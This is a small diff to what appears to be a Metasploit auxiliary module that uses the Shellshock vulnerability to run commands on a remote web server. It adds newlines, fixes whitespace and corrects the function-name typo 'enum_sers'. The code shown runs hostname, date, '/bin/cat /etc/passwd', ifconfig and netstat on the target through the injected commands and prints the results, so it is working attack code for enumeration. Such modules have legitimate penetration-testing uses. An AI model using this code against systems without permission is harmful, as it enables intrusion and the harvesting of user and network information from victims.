@@ -35,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
        output = parse(res)
        return output
     end
-   
+
     def parse(a)
         res_str = a.to_s
         re = Regexp.new "shellshock-resp:\r\n.*\r\n"
@@ -47,6 +47,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     def enum_sysinfo(uri)
+        print("\n")
         print_status("Enumerating System Information")
         hostname = exploit(uri, "hostname")
         date = exploit(uri, "date")
@@ -58,16 +59,17 @@ class Metasploit3 < Msf::Auxiliary
         print_good("    Date: " + date)
         print_good("    Uptime: " + uptime)
         print_good("    Kernel: " + kernel)
-    end
-    
+     end
+
     def enum_users(uri)
+        print("\n")
         print_status("Enumerating User Information")
         passwd = exploit(uri, "/bin/cat /etc/passwd")
 
         print_good("    Users:\n" + passwd + "\n")
     end
-    
-    def enum_network(uri)
+        def enum_network(uri)
+        print("\n")
         print_status("Enumerating Network Information")
         ifconfig = exploit(uri, "/sbin/ifconfig")
         netstat = exploit(uri, "/bin/netstat -an")
@@ -94,7 +96,7 @@ class Metasploit3 < Msf::Auxiliary
          uri = target_uri.path
 
          enum_sysinfo(uri)
-         enum_sers(uri)
+         enum_users(uri)
          enum_network(uri)
 
      end
